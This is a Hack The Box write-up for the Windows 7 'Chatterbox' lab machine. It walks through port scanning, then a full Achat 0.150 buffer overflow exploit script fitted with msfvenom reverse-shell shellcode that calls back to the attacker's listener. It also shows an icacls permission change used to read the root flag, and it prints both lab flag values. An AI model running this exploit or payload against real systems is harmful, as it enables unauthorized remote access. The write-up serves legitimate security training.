---
layout: single
title: Chatterbox - Hack The Box
excerpt: "Chatterbox is a medium and windows machine where're goint to exploit a buffer overflow to win access to the machine also we're going to use Icacls to see the root flag, this machine has another way to be solved but I will show the quickest way to solve it "
date: 2023-01-23
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-chatterbox/new.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Buffer Overflow
  - Icacls Abuse
---

<p align="center">
<img src="/assets/images/htb-writeup-chatterbox/logoc.png">
</p>

Chatterbox is a medium and windows machine where’re goint to exploit a buffer overflow to win access to the machine also we’re going to use Icacls to see the root flag, this machine has another way to be solved but I will show the quickest way to solve it

## PortScan

The machine has more open ports but nmap does not report them to me

```bash
❯ nmap -sCV -p135,139,445,49156 10.10.10.74 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-22 19:20 CST
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 19:20 (0:00:05 remaining)
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 19:21 (0:00:00 remaining)
Nmap scan report for 10.10.10.74
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49156/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h39m59s, deviation: 2h53m14s, median: 4h59m58s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-23T06:21:25
|_  start_date: 2023-01-23T06:15:18
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-23T01:21:27-05:00
```

## Enumeration

Version of the windows machine

```bash
❯ crackmapexec smb 10.10.10.74
SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
```

Let's check if the machine is vulnerable to eternal blue

```bash
❯ locate .nse | grep "ms17"
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
```

```bash
❯ nmap --script "vuln and safe" -p445 10.10.10.74 -oN smbScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-22 19:28 CST
Nmap scan report for 10.10.10.74
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 4.83 seconds
```

Is not vulnerable you can remember you can exploit it without using metasploit
- [https://github.com/MikeRega7/How-to-exploit-the-EternalBlue-vulnerability-without-Metasploit](https://github.com/MikeRega7/How-to-exploit-the-EternalBlue-vulnerability-without-Metasploit)

We can authenticate but we see that it does not share anything with us

```bash
❯ smbclient -L 10.10.10.74 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

## Buffer Overflow

```bash
❯ searchsploit Achat
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                    | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                       | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                          | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                            | php/webapps/24647.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We will not use metasploit

```bash
❯ searchsploit -m windows/remote/36025.py
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
File Type: Python script, ASCII text executable, with very long lines
```

If we check the exploit We can see that it is doing a buffer overflow but we don't want it to open the windows calculator as the exploit specifies that. Let's modify it to send a reverse shell to our system.

Use `msvenom` and copy your results to the script 
```bash
❯ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3822 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x6b\x4c\x77\x78\x65\x32\x6b\x50"
buf += b"\x6b\x50\x59\x70\x71\x50\x53\x59\x6a\x45\x30\x31"
buf += b"\x57\x50\x61\x54\x34\x4b\x50\x50\x6c\x70\x64\x4b"
buf += b"\x70\x52\x4a\x6c\x54\x4b\x4e\x72\x4b\x64\x52\x6b"
buf += b"\x64\x32\x6d\x58\x5a\x6f\x44\x77\x6f\x5a\x4d\x56"
buf += b"\x4e\x51\x79\x6f\x64\x6c\x4f\x4c\x33\x31\x31\x6c"
buf += b"\x6a\x62\x6e\x4c\x4f\x30\x76\x61\x36\x6f\x7a\x6d"
buf += b"\x49\x71\x35\x77\x38\x62\x68\x72\x51\x42\x71\x47"
buf += b"\x64\x4b\x72\x32\x7a\x70\x64\x4b\x4f\x5a\x6d\x6c"
buf += b"\x44\x4b\x70\x4c\x4b\x61\x62\x58\x7a\x43\x50\x48"
buf += b"\x5a\x61\x66\x71\x6e\x71\x32\x6b\x61\x49\x6d\x50"
buf += b"\x6d\x31\x58\x53\x44\x4b\x6e\x69\x4e\x38\x67\x73"
buf += b"\x4e\x5a\x61\x39\x52\x6b\x4d\x64\x74\x4b\x79\x71"
buf += b"\x69\x46\x50\x31\x4b\x4f\x76\x4c\x46\x61\x38\x4f"
buf += b"\x5a\x6d\x4b\x51\x45\x77\x4e\x58\x6b\x30\x52\x55"
buf += b"\x4a\x56\x5a\x63\x51\x6d\x6a\x58\x6d\x6b\x51\x6d"
buf += b"\x4f\x34\x32\x55\x4b\x34\x72\x38\x74\x4b\x62\x38"
buf += b"\x4f\x34\x49\x71\x38\x53\x72\x46\x52\x6b\x4a\x6c"
buf += b"\x6e\x6b\x52\x6b\x71\x48\x6d\x4c\x4a\x61\x46\x73"
buf += b"\x32\x6b\x4b\x54\x62\x6b\x4a\x61\x66\x70\x62\x69"
buf += b"\x6d\x74\x6b\x74\x6c\x64\x6f\x6b\x71\x4b\x73\x31"
buf += b"\x70\x59\x4e\x7a\x6f\x61\x69\x6f\x37\x70\x6f\x6f"
buf += b"\x4f\x6f\x61\x4a\x32\x6b\x4d\x42\x58\x6b\x42\x6d"
buf += b"\x6f\x6d\x6f\x78\x6e\x53\x4f\x42\x6b\x50\x49\x70"
buf += b"\x51\x58\x50\x77\x32\x53\x4d\x62\x61\x4f\x4e\x74"
buf += b"\x73\x38\x50\x4c\x54\x37\x4f\x36\x4b\x57\x39\x6f"
buf += b"\x77\x65\x46\x58\x74\x50\x4a\x61\x6b\x50\x49\x70"
buf += b"\x4e\x49\x35\x74\x61\x44\x30\x50\x72\x48\x4e\x49"
buf += b"\x63\x50\x50\x6b\x49\x70\x4b\x4f\x38\x55\x70\x50"
buf += b"\x6e\x70\x72\x30\x6e\x70\x4d\x70\x70\x50\x4f\x50"
buf += b"\x52\x30\x6f\x78\x49\x5a\x6c\x4f\x77\x6f\x6b\x30"
buf += b"\x4b\x4f\x67\x65\x64\x57\x31\x5a\x4d\x35\x63\x38"
buf += b"\x4b\x5a\x4c\x4a\x6c\x4e\x4c\x4a\x70\x68\x39\x72"
buf += b"\x6d\x30\x4d\x31\x57\x4b\x74\x49\x67\x76\x6f\x7a"
buf += b"\x6a\x70\x31\x46\x51\x47\x63\x38\x42\x79\x45\x55"
buf += b"\x42\x54\x33\x31\x49\x6f\x68\x55\x51\x75\x77\x50"
buf += b"\x34\x34\x7a\x6c\x6b\x4f\x4e\x6e\x7a\x68\x70\x75"
buf += b"\x5a\x4c\x73\x38\x6c\x30\x47\x45\x35\x52\x70\x56"
buf += b"\x6b\x4f\x59\x45\x72\x48\x50\x63\x70\x6d\x33\x34"
buf += b"\x6b\x50\x42\x69\x59\x53\x72\x37\x4f\x67\x32\x37"
buf += b"\x6c\x71\x6c\x36\x70\x6a\x5a\x72\x72\x39\x30\x56"
buf += b"\x79\x52\x69\x6d\x73\x36\x65\x77\x6d\x74\x4c\x64"
buf += b"\x6f\x4c\x59\x71\x4b\x51\x72\x6d\x6e\x64\x6f\x34"
buf += b"\x6c\x50\x59\x36\x79\x70\x6d\x74\x70\x54\x50\x50"
buf += b"\x70\x56\x6f\x66\x61\x46\x6f\x56\x31\x46\x4e\x6e"
buf += b"\x4e\x76\x61\x46\x52\x33\x4f\x66\x63\x38\x33\x49"
buf += b"\x56\x6c\x4d\x6f\x62\x66\x39\x6f\x68\x55\x63\x59"
buf += b"\x4b\x30\x50\x4e\x61\x46\x4d\x76\x69\x6f\x70\x30"
buf += b"\x73\x38\x79\x78\x42\x67\x4b\x6d\x31\x50\x4b\x4f"
buf += b"\x57\x65\x67\x4b\x7a\x50\x54\x75\x65\x52\x4e\x76"
buf += b"\x33\x38\x35\x56\x73\x65\x37\x4d\x45\x4d\x49\x6f"
buf += b"\x68\x55\x6d\x6c\x6b\x56\x71\x6c\x7a\x6a\x61\x70"
buf += b"\x6b\x4b\x79\x50\x42\x55\x79\x75\x75\x6b\x6f\x57"
buf += b"\x4e\x33\x30\x72\x42\x4f\x52\x4a\x49\x70\x61\x43"
buf += b"\x79\x6f\x57\x65\x41\x41"
```

This is the final script I only delete the instruccions of the script and I replace them with mine

```bash
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes


buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x6b\x4c\x77\x78\x65\x32\x6b\x50"
buf += b"\x6b\x50\x59\x70\x71\x50\x53\x59\x6a\x45\x30\x31"
buf += b"\x57\x50\x61\x54\x34\x4b\x50\x50\x6c\x70\x64\x4b"
buf += b"\x70\x52\x4a\x6c\x54\x4b\x4e\x72\x4b\x64\x52\x6b"
buf += b"\x64\x32\x6d\x58\x5a\x6f\x44\x77\x6f\x5a\x4d\x56"
buf += b"\x4e\x51\x79\x6f\x64\x6c\x4f\x4c\x33\x31\x31\x6c"
buf += b"\x6a\x62\x6e\x4c\x4f\x30\x76\x61\x36\x6f\x7a\x6d"
buf += b"\x49\x71\x35\x77\x38\x62\x68\x72\x51\x42\x71\x47"
buf += b"\x64\x4b\x72\x32\x7a\x70\x64\x4b\x4f\x5a\x6d\x6c"
buf += b"\x44\x4b\x70\x4c\x4b\x61\x62\x58\x7a\x43\x50\x48"
buf += b"\x5a\x61\x66\x71\x6e\x71\x32\x6b\x61\x49\x6d\x50"
buf += b"\x6d\x31\x58\x53\x44\x4b\x6e\x69\x4e\x38\x67\x73"
buf += b"\x4e\x5a\x61\x39\x52\x6b\x4d\x64\x74\x4b\x79\x71"
buf += b"\x69\x46\x50\x31\x4b\x4f\x76\x4c\x46\x61\x38\x4f"
buf += b"\x5a\x6d\x4b\x51\x45\x77\x4e\x58\x6b\x30\x52\x55"
buf += b"\x4a\x56\x5a\x63\x51\x6d\x6a\x58\x6d\x6b\x51\x6d"
buf += b"\x4f\x34\x32\x55\x4b\x34\x72\x38\x74\x4b\x62\x38"
buf += b"\x4f\x34\x49\x71\x38\x53\x72\x46\x52\x6b\x4a\x6c"
buf += b"\x6e\x6b\x52\x6b\x71\x48\x6d\x4c\x4a\x61\x46\x73"
buf += b"\x32\x6b\x4b\x54\x62\x6b\x4a\x61\x66\x70\x62\x69"
buf += b"\x6d\x74\x6b\x74\x6c\x64\x6f\x6b\x71\x4b\x73\x31"
buf += b"\x70\x59\x4e\x7a\x6f\x61\x69\x6f\x37\x70\x6f\x6f"
buf += b"\x4f\x6f\x61\x4a\x32\x6b\x4d\x42\x58\x6b\x42\x6d"
buf += b"\x6f\x6d\x6f\x78\x6e\x53\x4f\x42\x6b\x50\x49\x70"
buf += b"\x51\x58\x50\x77\x32\x53\x4d\x62\x61\x4f\x4e\x74"
buf += b"\x73\x38\x50\x4c\x54\x37\x4f\x36\x4b\x57\x39\x6f"
buf += b"\x77\x65\x46\x58\x74\x50\x4a\x61\x6b\x50\x49\x70"
buf += b"\x4e\x49\x35\x74\x61\x44\x30\x50\x72\x48\x4e\x49"
buf += b"\x63\x50\x50\x6b\x49\x70\x4b\x4f\x38\x55\x70\x50"
buf += b"\x6e\x70\x72\x30\x6e\x70\x4d\x70\x70\x50\x4f\x50"
buf += b"\x52\x30\x6f\x78\x49\x5a\x6c\x4f\x77\x6f\x6b\x30"
buf += b"\x4b\x4f\x67\x65\x64\x57\x31\x5a\x4d\x35\x63\x38"
buf += b"\x4b\x5a\x4c\x4a\x6c\x4e\x4c\x4a\x70\x68\x39\x72"
buf += b"\x6d\x30\x4d\x31\x57\x4b\x74\x49\x67\x76\x6f\x7a"
buf += b"\x6a\x70\x31\x46\x51\x47\x63\x38\x42\x79\x45\x55"
buf += b"\x42\x54\x33\x31\x49\x6f\x68\x55\x51\x75\x77\x50"
buf += b"\x34\x34\x7a\x6c\x6b\x4f\x4e\x6e\x7a\x68\x70\x75"
buf += b"\x5a\x4c\x73\x38\x6c\x30\x47\x45\x35\x52\x70\x56"
buf += b"\x6b\x4f\x59\x45\x72\x48\x50\x63\x70\x6d\x33\x34"
buf += b"\x6b\x50\x42\x69\x59\x53\x72\x37\x4f\x67\x32\x37"
buf += b"\x6c\x71\x6c\x36\x70\x6a\x5a\x72\x72\x39\x30\x56"
buf += b"\x79\x52\x69\x6d\x73\x36\x65\x77\x6d\x74\x4c\x64"
buf += b"\x6f\x4c\x59\x71\x4b\x51\x72\x6d\x6e\x64\x6f\x34"
buf += b"\x6c\x50\x59\x36\x79\x70\x6d\x74\x70\x54\x50\x50"
buf += b"\x70\x56\x6f\x66\x61\x46\x6f\x56\x31\x46\x4e\x6e"
buf += b"\x4e\x76\x61\x46\x52\x33\x4f\x66\x63\x38\x33\x49"
buf += b"\x56\x6c\x4d\x6f\x62\x66\x39\x6f\x68\x55\x63\x59"
buf += b"\x4b\x30\x50\x4e\x61\x46\x4d\x76\x69\x6f\x70\x30"
buf += b"\x73\x38\x79\x78\x42\x67\x4b\x6d\x31\x50\x4b\x4f"
buf += b"\x57\x65\x67\x4b\x7a\x50\x54\x75\x65\x52\x4e\x76"
buf += b"\x33\x38\x35\x56\x73\x65\x37\x4d\x45\x4d\x49\x6f"
buf += b"\x68\x55\x6d\x6c\x6b\x56\x71\x6c\x7a\x6a\x61\x70"
buf += b"\x6b\x4b\x79\x50\x42\x55\x79\x75\x75\x6b\x6f\x57"
buf += b"\x4e\x33\x30\x72\x42\x4f\x52\x4a\x49\x70\x61\x43"
buf += b"\x79\x6f\x57\x65\x41\x41"

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256) #IPaddress of the machine and port

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
```

## Reverse shell

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
```

```bash
❯ mv 36025.py Achar_exploit.py
```

```bash
❯ python2 Achar_exploit.py
---->{P00F}!
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
chatterbox\alfred

C:\Windows\system32>
```

## User flag 

```bash
cd C:\
cd C:\

dir /r /s user.txt
dir /r /s user.txt
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Alfred\Desktop

01/23/2023  04:01 PM                34 user.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               0 Dir(s)   3,348,525,056 bytes free

C:\>
cd C:\Users\Alfred\Desktop
cd C:\Users\Alfred\Desktop

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Alfred\Desktop

12/10/2017  06:50 PM    <DIR>          .
12/10/2017  06:50 PM    <DIR>          ..
01/23/2023  04:01 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,348,525,056 bytes free

type user.txt
type user.txt
ef780ac3c801b5b0aef63772a84ff8d3

C:\Users\Alfred\Desktop>
```

We can enter to the Desktop but we can't see the root flag

```bash
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of C:\Users\Administrator\Desktop

12/10/2017  06:50 PM    <DIR>          .
12/10/2017  06:50 PM    <DIR>          ..
01/23/2023  04:01 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,348,930,560 bytes free

whoami
whoami
chatterbox\alfred

type root.txt
type root.txt
Access is denied.

C:\Users\Administrator\Desktop>
```

```bash
whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\Administrator\Desktop>
```

If we look at the directory for Desktop itself, Alfred has permissions on it

```bash
cd ..

icacls Desktop
icacls Desktop
Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator>
```

## Root flag

We can change the access to read the root flag with `icacls`

```bash
icacls root.txt /grant alfred:F
icacls root.txt /grant alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files

type root.txt
type root.txt
faae751f8b5573e93ae1e47810002c07

C:\Users\Administrator\Desktop>
```

There is another way to access the machine with the Invoke-PowerShellTcp.ps1 but if you want to see how to do it you can see the writeup of 0xdf or another person you prefer 

- [https://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html](https://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html)

- [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)


